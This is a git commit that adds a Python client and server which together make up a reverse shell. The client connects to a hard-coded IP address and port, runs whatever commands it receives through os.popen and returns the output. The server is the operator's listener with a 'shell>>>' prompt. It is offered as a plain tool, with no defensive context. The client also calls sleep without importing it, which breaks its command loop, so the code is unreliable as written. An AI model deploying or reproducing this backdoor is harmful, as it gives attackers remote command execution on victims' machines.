6dc859f741c9ceb0c22837f0ef0bc30cdb28379d
Kiyotaka_Ayanokoji <75192306+lnznjn@users.noreply.github.com>
2021-10-01 15:55:21 +0800

    Add files via upload

---
+++ client.py
@@ -0,0 +1,33 @@
+import socket
+import os
+import sys
+import time
+
+def client():
+    try:
+        clie = socket.socket()
+        clie.connect(("192.168.124.28", 6666))
+
+    except socket.error as e:
+        sys.exit(1)
+
+    while True:
+        cmd = clie.recv(1024).decode()
+        if cmd == "exit":
+            clie.close()
+            sys.exit(1)
+
+        else:
+            with os.popen(cmd, "r") as f:
+                ret = f.read()
+                sleep(1)
+                f.close()
+
+                if ret:
+                    clie.send(ret.encode())
+
+                else:
+                    clie.send("ret = NONE".encode())
+
+if __name__ == "__main__":
+    client()
---
+++ server.py
@@ -0,0 +1,47 @@
+import socket
+import sys
+from threading import Thread
+
+def server():
+    LHOST = str(input("LHOST: "))
+    LPORT = int(input("LPORT: "))
+    ser_addr = (LHOST,LPORT)
+
+    try:
+        ser = socket.socket()
+        ser.bind(ser_addr)
+        ser.listen(5)
+
+    except socket.error as e:
+        print("[-] {}".format(e))
+
+    print("[*] waiting...")
+
+    while True:
+        client_socket, client_addr = ser.accept()
+
+        if client_socket and client_addr:
+            t = Thread(target=send_data, args=(client_socket, client_addr))
+            t.start()
+
+def send_data(client_socket, client_addr):
+    print("[+] {} up!".format(client_addr))
+
+    while True:
+        data = client_socket.recv(1024).decode()
+        print(data)
+
+        cmd = str(input("shell>>> "))
+
+        if cmd == "exit":
+            client_socket.send(cmd.encode())
+            sys.exit(1)
+
+        elif cmd:
+            client_socket.send(cmd.encode())
+
+        else:
+            print("\n")
+
+if __name__ == "__main__":
+    server()
